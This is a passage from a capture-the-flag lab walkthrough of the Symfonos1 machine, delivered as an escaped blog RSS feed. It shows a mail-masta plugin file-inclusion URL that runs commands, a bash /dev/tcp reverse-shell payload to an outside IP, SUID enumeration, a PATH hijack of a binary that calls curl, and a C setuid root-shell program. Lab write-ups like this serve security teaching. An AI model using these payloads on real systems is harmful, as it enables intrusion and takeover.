  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos12.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;amp;cmd=whoami
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos13.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we can get a reverse shell using this payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;/bin/bash -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -i &amp;gt;%26 /dev/tcp/192.168.191.1/9000 0&amp;gt;%261 %26&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;Usual enumeration for privilege escalation involves looking for suid binaries by using find.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;find / -perm -4000 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary statuscheck isn&amp;rsquo;t among the linux default ones.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos14.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After running it and then running strings against it, it calls the curl command when executed.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos15.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since it doesn&amp;rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
curl command.&lt;/p&gt;
&lt;p&gt;In my custom curl script I get a copy of bash and give it suid permissions:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos16.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;rooted&#34;&gt;Rooted&lt;/h3&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos17.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;Better way to handle the sending email part using sendEmail:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test Subject&amp;#34;&lt;/span&gt; -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test Message&amp;#34;&lt;/span&gt; -o tls&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Better suid exploit, compiling a c program that correctly sets the uid and gid as root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    setgid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); 
    setuid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    execl(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos18.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
  </channel>
</rss>
